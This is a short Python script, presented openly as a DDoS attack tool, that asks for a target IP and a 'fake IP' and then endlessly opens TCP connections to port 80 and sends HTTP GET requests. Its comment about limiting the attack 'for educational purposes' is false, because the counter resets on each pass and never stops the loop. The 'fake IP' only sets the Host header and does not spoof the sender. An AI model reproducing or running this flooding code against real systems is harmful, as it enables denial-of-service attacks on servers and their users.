import socket
import threading

port = 80
target = '10.0.0.138'
fake_ip = '182.21.20.32'

while True:
    target = input("Enter your target (or press Enter for default '10.0.0.138'): ")
    if target == '':
        target = '10.0.0.138'
        
    fake_ip = input("Enter your fake IP Address (or press Enter for default '182.21.20.32'): ")
    if fake_ip == '':
        fake_ip = '182.21.20.32'
        
    print(f"Target: {target}")
    print(f"Fake IP: {fake_ip}")
    
    userInput = input("Is this the correct value you want to use? [Y/N] ")
    if userInput.lower() == 'y':
        break  # Exit the loop if the input is 'Y' or 'y'
    elif userInput.lower() == 'n':
        continue  # Go back to the beginning of the loop
    else:
        print("Invalid input. Please enter Y or N.")



def attack():
    print("Starting DDOS Attack...!")
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port)) #Establishes a connection to the target network
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port)) #Spams request on the target netowrk
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        attack_num = 10 #Limit the number for educational purposes 
        attack_num += 1
        print(attack_num)
        s.close()

attack()